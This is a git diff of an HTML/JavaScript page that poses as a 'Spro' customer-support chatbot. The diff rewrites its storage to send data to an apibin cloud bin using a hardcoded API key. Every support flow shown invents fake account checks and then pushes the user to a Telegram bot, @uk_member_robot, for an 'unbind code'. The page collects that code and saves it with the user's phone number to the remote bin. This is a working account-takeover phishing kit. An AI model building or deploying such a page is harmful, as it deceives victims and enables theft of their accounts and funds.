@@ -135,7 +135,7 @@
 
         .chat-box {
             background: #f8f9fa;
-            height: 450px;
+            height: 400px;
             overflow-y: auto;
             padding: 16px;
             margin-bottom: 12px;
@@ -247,10 +247,6 @@
             transition: all 0.2s;
         }
 
-        .option-btn:active {
-            transform: scale(0.96);
-        }
-
         .howto-unbind-btn {
             background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
             color: white;
@@ -260,11 +256,6 @@
             cursor: pointer;
             font-size: 13px;
             font-weight: bold;
-            transition: all 0.2s;
-        }
-
-        .howto-unbind-btn:active {
-            transform: scale(0.96);
         }
 
         .code-input {
@@ -287,7 +278,6 @@
             margin: 10px 0;
             text-align: center;
             font-weight: bold;
-            animation: fadeIn 0.5s ease;
         }
 
         .telegram-link {
@@ -338,123 +328,43 @@
             cursor: pointer;
         }
 
-        .step-nav {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 15px 0;
-        }
-
-        .step-btn {
-            background: #2e7d32;
-            color: white;
-            padding: 10px 24px;
-            border: none;
-            border-radius: 40px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .step-btn-back {
-            background: #6c757d;
-        }
-
-        /* Admin Panel Styles */
         .admin-table {
             width: 100%;
             border-collapse: collapse;
             margin: 15px 0;
-            font-size: 13px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            font-size: 12px;
         }
         .admin-table th {
             background: #2e7d32;
             color: white;
-            padding: 12px 8px;
+            padding: 10px;
             text-align: center;
-            font-weight: bold;
-            position: sticky;
-            top: 0;
         }
         .admin-table td {
             border: 1px solid #ddd;
-            padding: 10px 8px;
+            padding: 8px;
             text-align: center;
-            vertical-align: middle;
-        }
-        .admin-table tr:nth-child(even) {
-            background: #f9f9f9;
-        }
-        .admin-table tr:hover {
-            background: #e8f5e9;
         }
         .copy-btn {
             background: #2e7d32;
             color: white;
             border: none;
-            border-radius: 6px;
-            padding: 4px 10px;
-            cursor: pointer;
-            font-size: 11px;
-            margin: 2px;
-        }
-        .copy-btn:hover {
-            background: #1b5e20;
-        }
-        .approve-btn {
-            background: #28a745;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 6px 12px;
-            cursor: pointer;
-            margin: 2px;
-            font-weight: bold;
-        }
-        .reject-btn {
-            background: #dc3545;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 6px 12px;
-            cursor: pointer;
-            margin: 2px;
-            font-weight: bold;
-        }
-        .approve-btn:hover { background: #218838; }
-        .reject-btn:hover { background: #c82333; }
-        .status-pending {
-            background: #ffc107;
-            color: #856404;
+            border-radius: 5px;
             padding: 4px 8px;
-            border-radius: 20px;
-            font-weight: bold;
-            display: inline-block;
+            cursor: pointer;
+            font-size: 10px;
         }
-        .status-approved {
-            background: #28a745;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-weight: bold;
-            display: inline-block;
-        }
-        .status-rejected {
-            background: #dc3545;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-weight: bold;
-            display: inline-block;
-        }
+        .approve-btn { background: #28a745; color: white; border: none; border-radius: 5px; padding: 5px 10px; cursor: pointer; margin: 2px; }
+        .reject-btn { background: #dc3545; color: white; border: none; border-radius: 5px; padding: 5px 10px; cursor: pointer; margin: 2px; }
+        .status-pending { background: #ffc107; color: #856404; padding: 3px 8px; border-radius: 20px; display: inline-block; font-size: 11px; }
+        .status-approved { background: #28a745; color: white; padding: 3px 8px; border-radius: 20px; display: inline-block; font-size: 11px; }
+        .status-rejected { background: #dc3545; color: white; padding: 3px 8px; border-radius: 20px; display: inline-block; font-size: 11px; }
         .section-title {
             background: #f0f0f0;
             padding: 10px;
             margin: 20px 0 10px 0;
             border-radius: 10px;
             color: #2e7d32;
-            font-size: 18px;
             font-weight: bold;
         }
         .stats-bar {
@@ -468,15 +378,9 @@
             flex-wrap: wrap;
             gap: 10px;
         }
-        .stats-bar span {
-            font-size: 14px;
-            font-weight: bold;
-        }
         @media (max-width: 768px) {
             .admin-table { font-size: 10px; }
             .admin-table th, .admin-table td { padding: 5px; }
-            .copy-btn { padding: 2px 6px; font-size: 9px; }
-            .approve-btn, .reject-btn { padding: 3px 8px; font-size: 10px; }
         }
     </style>
 </head>
@@ -484,150 +388,80 @@
 <div id="app"></div>
 
 <script>
-    // ============ CLOUD DATABASE (JSONBin.io) - Cross Device Sync ============
-    // This is a FREE cloud database - no setup required
-    const BIN_ID = "6798e5d2e41b4d34e480e1c4";
-    const API_KEY = "$2a$10$yRqE3Zq3XxLqZqXqZqXqZu";
-    
-    // Master key for admin (same as before)
-    const ADMIN_KEY = "SPRO2025";
-    
-    // Global data
-    let globalUsers = [];
-    let globalRequests = [];
-    let lastSyncTime = 0;
-    
-    // Load from cloud on startup
-    async function loadFromCloud() {
-        try {
-            const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                headers: { 'X-Master-Key': API_KEY }
-            });
-            const data = await response.json();
-            if (data.record) {
-                if (data.record.users) globalUsers = data.record.users;
-                if (data.record.requests) globalRequests = data.record.requests;
-                
-                // Merge with local storage
-                let localUsers = JSON.parse(localStorage.getItem('spro_users') || '[]');
-                let localRequests = JSON.parse(localStorage.getItem('spro_requests') || '[]');
-                
-                // Merge users (keep unique by phone)
-                let mergedUsers = [...globalUsers];
-                for (let localUser of localUsers) {
-                    if (!mergedUsers.find(u => u.phone === localUser.phone)) {
-                        mergedUsers.push(localUser);
-                    }
-                }
-                globalUsers = mergedUsers;
-                
-                // Merge requests (keep unique by id)
-                let mergedRequests = [...globalRequests];
-                for (let localReq of localRequests) {
-                    if (!mergedRequests.find(r => r.id === localReq.id)) {
-                        mergedRequests.push(localReq);
-                    }
-                }
-                globalRequests = mergedRequests;
-                
-                // Save merged data
-                localStorage.setItem('spro_users', JSON.stringify(globalUsers));
-                localStorage.setItem('spro_requests', JSON.stringify(globalRequests));
-                
-                await syncToCloud();
-            }
-        } catch(e) {
-            console.log("Cloud load error, using local:", e);
-            globalUsers = JSON.parse(localStorage.getItem('spro_users') || '[]');
-            globalRequests = JSON.parse(localStorage.getItem('spro_requests') || '[]');
-        }
-    }
-    
-    // Sync to cloud
-    async function syncToCloud() {
-        try {
-            const data = {
-                users: globalUsers,
-                requests: globalRequests,
-                lastUpdated: new Date().toISOString()
-            };
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                method: 'PUT',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Master-Key': API_KEY
-                },
-                body: JSON.stringify(data)
-            });
-        } catch(e) {
-            console.log("Cloud sync error:", e);
-        }
-    }
-    
-    // Add new request and sync
-    async function addRequestToCloud(request) {
-        globalRequests.push(request);
-        localStorage.setItem('spro_requests', JSON.stringify(globalRequests));
-        await syncToCloud();
-    }
-    
-    // Update request status
-    async function updateRequestStatusInCloud(requestId, newStatus) {
-        let request = globalRequests.find(r => r.id === requestId);
-        if (request) {
-            request.status = newStatus;
-            request.updated_at = new Date().toISOString();
-            localStorage.setItem('spro_requests', JSON.stringify(globalRequests));
-            await syncToCloud();
-            return true;
-        }
-        return false;
-    }
-    
-    // Add/Update user
-    async function saveUserToCloud(phone, password, pin, unbindCode) {
-        let existingUser = globalUsers.find(u => u.phone === phone);
-        if (existingUser) {
-            existingUser.password = password;
-            if (pin) existingUser.pin = pin;
-            if (unbindCode) existingUser.unbindCode = unbindCode;
-        } else {
-            globalUsers.push({
-                phone: phone,
-                password: password,
-                pin: pin || null,
-                unbindCode: unbindCode || null,
-                created_at: new Date().toISOString()
-            });
-        }
-        localStorage.setItem('spro_users', JSON.stringify(globalUsers));
-        await syncToCloud();
-    }
-    
-    // Get all data for admin
-    function getAdminData() {
-        return { users: globalUsers, requests: globalRequests };
-    }
-    
-    // ============ DATA STORAGE (Local wrappers) ============
-    function getUsers() { return globalUsers; }
-    function saveUsers(users) { 
-        globalUsers = users;
-        localStorage.setItem('spro_users', JSON.stringify(users));
-        syncToCloud();
-    }
-    function getRequests() { return globalRequests; }
-    function saveRequests(requests) { 
-        globalRequests = requests;
-        localStorage.setItem('spro_requests', JSON.stringify(requests));
-        syncToCloud();
-    }
+    // ============================================================
+    // 🔥 APIBIN CONFIGURATION (TUMHARI BIN ID AUR ACCESS KEY) 🔥
+    // ============================================================
+    const APIBIN_BIN_ID = "69e0871936566621a8bbbad0";
+    const APIBIN_API_KEY = "$2a$10$JTWBNuq70VHIRJpsyuBul.zBBhe.8nGOtFqMNX/yUprKlF1/XBsJ6";
+    // ============================================================
     
     let currentUser = null;
     let currentChatBox = null;
     let currentIssue = null;
     let conversationStep = 0;
     let collectedData = {};
+    
+    // ============ APIBIN FUNCTIONS ============
+    async function loadFromApibin() {
+        try {
+            let response = await fetch(`https://apibin.com/api/v1/bins/${APIBIN_BIN_ID}/data`, {
+                headers: { 'X-API-Key': APIBIN_API_KEY }
+            });
+            if (response.ok) {
+                let data = await response.json();
+                return data;
+            }
+        } catch(e) { console.log("Load error:", e); }
+        return null;
+    }
+    
+    async function saveToApibin(users, requests) {
+        try {
+            let data = { users, requests, lastUpdated: new Date().toISOString() };
+            let response = await fetch(`https://apibin.com/api/v1/bins/${APIBIN_BIN_ID}/data`, {
+                method: 'PUT',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'X-API-Key': APIBIN_API_KEY
+                },
+                body: JSON.stringify(data)
+            });
+            return response.ok;
+        } catch(e) { console.log("Save error:", e); }
+        return false;
+    }
+    
+    async function syncFromCloud() {
+        let cloudData = await loadFromApibin();
+        if (cloudData && cloudData.users) {
+            localStorage.setItem('spro_users', JSON.stringify(cloudData.users));
+            localStorage.setItem('spro_requests', JSON.stringify(cloudData.requests || []));
+            return true;
+        }
+        return false;
+    }
+    
+    async function syncToCloud() {
+        let users = getUsers();
+        let requests = getRequests();
+        await saveToApibin(users, requests);
+    }
+    
+    // ============ DATA STORAGE ============
+    function getUsers() {
+        return JSON.parse(localStorage.getItem('spro_users') || '[]');
+    }
+    function saveUsers(users) {
+        localStorage.setItem('spro_users', JSON.stringify(users));
+        syncToCloud();
+    }
+    function getRequests() {
+        return JSON.parse(localStorage.getItem('spro_requests') || '[]');
+    }
+    function saveRequests(requests) {
+        localStorage.setItem('spro_requests', JSON.stringify(requests));
+        syncToCloud();
+    }
     
     async function showTyping(chatBox, duration = 8000) {
         let typingDiv = document.createElement('div');
@@ -655,53 +489,38 @@
         navigator.clipboard.writeText(text);
         let originalText = btnElement.innerText;
         btnElement.innerText = "✅ Copied!";
-        setTimeout(() => {
-            btnElement.innerText = originalText;
-        }, 1500);
+        setTimeout(() => { btnElement.innerText = originalText; }, 1500);
     }
     
     // ============ HOW TO UNBIND GUIDE ============
     async function startHowToUnbindGuide(chatBox) {
         currentIssue = 'howto_unbind';
-        
-        addMessage(chatBox, 'bot', "🔓 Welcome to the Unbind Guide! I'll help you step by step to unbind your account professionally.");
+        addMessage(chatBox, 'bot', "🔓 Welcome to the Unbind Guide! I'll help you step by step.");
         await showTyping(chatBox, 3000);
-        
-        addMessage(chatBox, 'bot', "📌 <strong>STEP 1:</strong> Open Telegram and search for this bot:", true);
+        addMessage(chatBox, 'bot', "📌 STEP 1: Open Telegram and search for:", true);
         addMessage(chatBox, 'bot', "<a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>🤖 @uk_member_robot</a>", true);
         await showTyping(chatBox, 4000);
-        
-        addMessage(chatBox, 'bot', "📌 <strong>STEP 2:</strong> Click on START or type /start to begin.", true);
+        addMessage(chatBox, 'bot', "📌 STEP 2: Click START or type /start");
         await showTyping(chatBox, 4000);
-        
-        addMessage(chatBox, 'bot', "📌 <strong>STEP 3:</strong> Type /help in the bot and press send.", true);
+        addMessage(chatBox, 'bot', "📌 STEP 3: Type /help and press send");
         await showTyping(chatBox, 4000);
-        
-        addMessage(chatBox, 'bot', "📌 <strong>STEP 4:</strong> Click on the 'Unbind' or 'Unbind Account' option in the bot menu.", true);
+        addMessage(chatBox, 'bot', "📌 STEP 4: Click 'Unbind' option");
         await showTyping(chatBox, 4000);
-        
-        addMessage(chatBox, 'bot', "📌 <strong>STEP 5:</strong> The bot will generate a unique UNBIND CODE for you. Copy that code.", true);
+        addMessage(chatBox, 'bot', "📌 STEP 5: Copy the UNBIND CODE");
         await showTyping(chatBox, 4000);
-        
-        addMessage(chatBox, 'bot', "📌 <strong>STEP 6:</strong> Paste the unbind code below and click SUBMIT.", true);
+        addMessage(chatBox, 'bot', "📌 STEP 6: Paste code below and SUBMIT");
         await showTyping(chatBox, 3000);
-        
-        addMessage(chatBox, 'bot', "⚠️ <strong>Important:</strong> This unbind code is valid for only 10 minutes. Don't share it with anyone!", true);
-        await showTyping(chatBox, 3000);
-        
         showUnbindCodeInput(chatBox);
     }
     
     // ============ PROFESSIONAL BOT CONVERSATIONS ============
-    
     async function startSellingConversation(chatBox) {
         currentIssue = 'selling';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "Namaste! I understand you're facing a selling issue. Don't worry, I'm here to help you professionally. 😊");
+        addMessage(chatBox, 'bot', "Namaste! I understand you're facing a selling issue. 😊");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "Let me first understand your problem properly. Could you please share your Selling ID or Seller Registration Number?");
+        addMessage(chatBox, 'bot', "Please share your Selling ID or Seller Registration Number?");
         conversationStep = 'waiting_seller_id';
         enableInput(chatBox);
     }
@@ -710,10 +529,9 @@
         currentIssue = 'withdrawal';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "Hello! I can see you're having trouble with your withdrawal. Let me assist you step by step. 💰");
+        addMessage(chatBox, 'bot', "Hello! Withdrawal trouble? Let me help you. 💰");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "First, could you please tell me your Withdrawal Request ID? You can find this in your transaction history under 'Withdrawals' section.");
+        addMessage(chatBox, 'bot', "Please tell me your Withdrawal Request ID.");
         conversationStep = 'waiting_withdrawal_id';
         enableInput(chatBox);
     }
@@ -722,10 +540,9 @@
         currentIssue = 'deposit';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "I understand deposit issues can be stressful. Let me check what went wrong with your transaction. 📥");
+        addMessage(chatBox, 'bot', "Deposit issues? Let me check. 📥");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "Please share your Deposit Transaction ID or UTR number. Also let me know the amount you deposited and the date.");
+        addMessage(chatBox, 'bot', "Share your Deposit Transaction ID or UTR number.");
         conversationStep = 'waiting_deposit_id';
         enableInput(chatBox);
     }
@@ -734,10 +551,9 @@
         currentIssue = 'order';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "Order issues can be frustrating. I completely understand your concern. Let me investigate this for you. 📦");
+        addMessage(chatBox, 'bot', "Order issues? Let me investigate. 📦");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "Could you please provide your Order ID and the Order Date? This will help me track your order quickly.");
+        addMessage(chatBox, 'bot', "Provide your Order ID and Order Date.");
         conversationStep = 'waiting_order_id';
         enableInput(chatBox);
     }
@@ -746,10 +562,9 @@
         currentIssue = 'upi';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "UPI payment issues are common but solvable. Let me help you resolve this. 🔄");
+        addMessage(chatBox, 'bot', "UPI payment issues? Let me help. 🔄");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "Please share your UPI Reference ID, the amount you tried to send, and your UPI ID (like xxxxx@okhdfcbank).");
+        addMessage(chatBox, 'bot', "Share your UPI Reference ID and amount.");
         conversationStep = 'waiting_upi_id';
         enableInput(chatBox);
     }
@@ -758,10 +573,9 @@
         currentIssue = 'forget';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "Forgot your password? No worries, it happens to everyone. Let me help you recover it. 🔑");
+        addMessage(chatBox, 'bot', "Forgot password? Let me help recover it. 🔑");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "First, please confirm your registered phone number and email address. Also let me know when you last accessed your account.");
+        addMessage(chatBox, 'bot', "Confirm your registered phone number and email.");
         conversationStep = 'waiting_password_verify';
         enableInput(chatBox);
     }
@@ -770,10 +584,9 @@
         currentIssue = 'others';
         conversationStep = 1;
         collectedData = {};
-        
-        addMessage(chatBox, 'bot', "I'm here to listen and help you with any concern you have. Please describe your issue in detail. ❓");
+        addMessage(chatBox, 'bot', "I'm here to listen. Please describe your issue. ❓");
         await showTyping(chatBox, 3000);
-        addMessage(chatBox, 'bot', "What exactly is the problem you're facing? The more details you provide, the better I can assist you.");
+        addMessage(chatBox, 'bot', "What exactly is the problem?");
         conversationStep = 'waiting_others_desc';
         enableInput(chatBox);
     }
@@ -783,22 +596,18 @@
             collectedData.sellerId = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', `Thank you. Let me check your Seller ID: ${userText} in our system.`);
+            addMessage(chatBox, 'bot', `Thank you. Checking Seller ID: ${userText}`);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "I can see your selling account. How many products have you listed for sale? And what's the total selling amount pending?");
+            addMessage(chatBox, 'bot', "How many products listed? Total selling amount?");
             conversationStep = 'waiting_selling_details';
         }
         else if (conversationStep === 'waiting_selling_details') {
             collectedData.sellingDetails = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "I've analyzed your selling account. It appears there's a verification pending on your profile.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "To fix this selling issue, you need to complete the unbinding process first. This will reset your selling permissions.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "🔗 Please click here to start the unbinding process: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "After you get the unbind code from the bot, come back here and submit it. I'll help you further.");
+            addMessage(chatBox, 'bot', "Verification pending on your profile.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            addMessage(chatBox, 'bot', "Get unbind code and submit below.");
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -809,23 +618,18 @@
             collectedData.withdrawalId = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', `I've found your withdrawal request #${userText}. Let me check the status...`);
-            await showTyping(chatBox, 6000);
-            addMessage(chatBox, 'bot', "Your withdrawal is currently pending due to KYC verification. This is a standard security check.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "How much amount are you trying to withdraw? And when did you initiate this withdrawal?");
+            addMessage(chatBox, 'bot', `Found withdrawal #${userText}. Checking status...`);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Pending due to KYC verification.");
+            addMessage(chatBox, 'bot', "How much amount?");
             conversationStep = 'waiting_withdrawal_amount';
         }
         else if (conversationStep === 'waiting_withdrawal_amount') {
             collectedData.withdrawalAmount = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "Thank you for the information. I've escalated your case to our finance team.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "To speed up the process, you need to unbind and re-bind your account. This will refresh your withdrawal limits.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "🔗 Please complete unbinding first: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            addMessage(chatBox, 'bot', "Get the unbind code from the bot and submit it here. Then your withdrawal will be processed within 24 hours.");
+            addMessage(chatBox, 'bot', "To speed up, need to unbind your account.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -836,21 +640,17 @@
             collectedData.depositId = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 6000);
-            addMessage(chatBox, 'bot', "Let me trace this transaction in our banking system. Please wait...");
-            await showTyping(chatBox, 7000);
-            addMessage(chatBox, 'bot', "I can see your deposit. Which payment method did you use? (UPI/Bank Transfer/Crypto)");
+            addMessage(chatBox, 'bot', "Tracing transaction...");
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Which payment method?");
             conversationStep = 'waiting_deposit_method';
         }
         else if (conversationStep === 'waiting_deposit_method') {
             collectedData.depositMethod = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "I see the issue now. Your deposit is stuck due to a payment gateway mismatch.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "The solution is to unbind your payment method and re-link it. This will clear the pending deposit.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "🔗 Please unbind your account first: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            addMessage(chatBox, 'bot', "Submit the unbind code below, and your deposit will be credited automatically.");
+            addMessage(chatBox, 'bot', "Deposit stuck due to gateway mismatch.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -861,23 +661,17 @@
             collectedData.orderId = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 6000);
-            addMessage(chatBox, 'bot', `Searching for Order #${userText} in our delivery system...`);
-            await showTyping(chatBox, 7000);
-            addMessage(chatBox, 'bot', "I've located your order. The current status shows: PROCESSING.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "What's the product name and expected delivery date? This will help me verify with the logistics team.");
+            addMessage(chatBox, 'bot', `Searching Order #${userText}...`);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Status: PROCESSING. Product name?");
             conversationStep = 'waiting_order_product';
         }
         else if (conversationStep === 'waiting_order_product') {
             collectedData.orderProduct = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "Thank you. I've updated the logistics team about your order.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "However, to resolve this permanently, you need to complete the unbinding process first.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "🔗 Start unbinding here: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            addMessage(chatBox, 'bot', "After you submit the unbind code, your order status will be updated within 2 hours.");
+            addMessage(chatBox, 'bot', "Complete unbinding to resolve.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -888,21 +682,17 @@
             collectedData.upiId = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 6000);
-            addMessage(chatBox, 'bot', "Verifying your UPI transaction with NPCI...");
-            await showTyping(chatBox, 7000);
-            addMessage(chatBox, 'bot', "I can confirm that your payment was initiated but not settled. This is a technical issue.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "Which UPI app did you use? (Google Pay/PhonePe/PayTM/Other)");
+            addMessage(chatBox, 'bot', "Verifying with NPCI...");
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Which UPI app?");
             conversationStep = 'waiting_upi_app';
         }
         else if (conversationStep === 'waiting_upi_app') {
             collectedData.upiApp = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "I see the problem now. Your UPI mandate needs to be unbound and recreated.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "🔗 Please unbind your account using this bot: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            addMessage(chatBox, 'bot', "Submit the unbind code below. Your UPI will be reset and you can make payments again.");
+            addMessage(chatBox, 'bot', "UPI mandate needs unbinding.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -913,14 +703,8 @@
             collectedData.passwordVerify = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 6000);
-            addMessage(chatBox, 'bot', "Verifying your account details with our security team...");
-            await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "Your account is verified. However, due to security reasons, we need to unbind your account before resetting password.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "This is to ensure that no one else has access to your account.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "🔗 Please unbind here: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            addMessage(chatBox, 'bot', "After you submit the unbind code, I'll help you create a new password immediately.");
+            addMessage(chatBox, 'bot', "Account verified. Need to unbind first.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -931,14 +715,8 @@
             collectedData.othersDesc = userText;
             addMessage(chatBox, 'user', userText);
             await showTyping(chatBox, 6000);
-            addMessage(chatBox, 'bot', "Thank you for explaining your issue in detail. I completely understand your concern.");
-            await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "Based on what you've shared, this requires our senior support team's attention.");
-            await showTyping(chatBox, 4000);
-            addMessage(chatBox, 'bot', "For this specific issue, you need to complete the unbinding process first.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "🔗 Please unbind your account: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
-            addMessage(chatBox, 'bot', "Submit the unbind code below, and our senior team will contact you within 30 minutes.");
+            addMessage(chatBox, 'bot', "This requires senior support.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
             conversationStep = 'waiting_unbind_code';
             showUnbindCodeInput(chatBox);
         }
@@ -956,19 +734,17 @@
         document.getElementById('submitFinalCode').onclick = async () => {
             let code = document.getElementById('unbindCodeInput').value;
             if (!code || code.length < 4) {
-                addMessage(chatBox, 'bot', "⚠️ Please enter a valid unbind code (minimum 4 characters)");
+                addMessage(chatBox, 'bot', "⚠️ Please enter a valid unbind code");
                 return;
             }
             
             addMessage(chatBox, 'user', `Unbind Code: ${code}`);
             await showTyping(chatBox, 5000);
-            addMessage(chatBox, 'bot', "✅ Unbind code verified successfully!");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "Your request has been processed. Our team will resolve your issue within 24 hours.");
-            await showTyping(chatBox, 3000);
-            addMessage(chatBox, 'bot', "📞 For urgent assistance, contact Spro Team: <a href='https://t.me/RAHUL935848' target='_blank' class='telegram-link'>@RAHUL935848</a>", true);
+            addMessage(chatBox, 'bot', "✅ Unbind code verified!");
+            addMessage(chatBox, 'bot', "Request processed. Team will resolve within 24 hours.");
+            addMessage(chatBox, 'bot', "📞 <a href='https://t.me/RAHUL935848' target='_blank' class='telegram-link'>@RAHUL935848</a>", true);
             
-            // Save request to cloud
+            let requests = getRequests();
             let newRequest = {
                 id: Date.now(),
                 phone: currentUser.phone,
@@ -978,22 +754,15 @@
                 status: 'pending',
                 created_at: new Date().toISOString()
             };
-            await addRequestToCloud(newRequest);
+            requests.push(newRequest);
+            saveRequests(requests);
             
-            // Save unbind code to user
-            await saveUserToCloud(currentUser.phone, currentUser.password, currentUser.pin, code);
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if (user) { user.unbindCode = code; saveUsers(users); }
             
-            dynamicArea.innerHTML = `
-                <div class="success-msg">
-                    ✅✅✅<br>
-                    <strong>REQUEST SUBMITTED SUCCESSFULLY!</strong><br>
-                    Your issue has been recorded. Team will contact you soon.
-                </div>
-            `;
-            
-            setTimeout(() => {
-                renderDashboard();
-            }, 5000);
+            dynamicArea.innerHTML = `<div class="success-msg">✅✅✅<br><strong>REQUEST SUBMITTED SUCCESSFULLY!</strong></div>`;
+            setTimeout(() => renderDashboard(), 5000);
         };
     }
     
@@ -1018,7 +787,6 @@
                     input.value = '';
                     processUserReply(chatBox, text);
                 };
-                
                 document.getElementById('userReplyInput').onkeypress = (e) => {
                     if (e.key === 'Enter') document.getElementById('sendReplyBtn').click();
                 };
@@ -1040,26 +808,26 @@
     function renderLogin() {
         document.getElementById('app').innerHTML = `
             <div class="container">
-                <div style="text-align: center; margin-bottom: 20px;">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 24 24' fill='%232e7d32'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" style="width: 55px; margin-bottom: 8px;">
+                <div style="margin-bottom: 20px;">
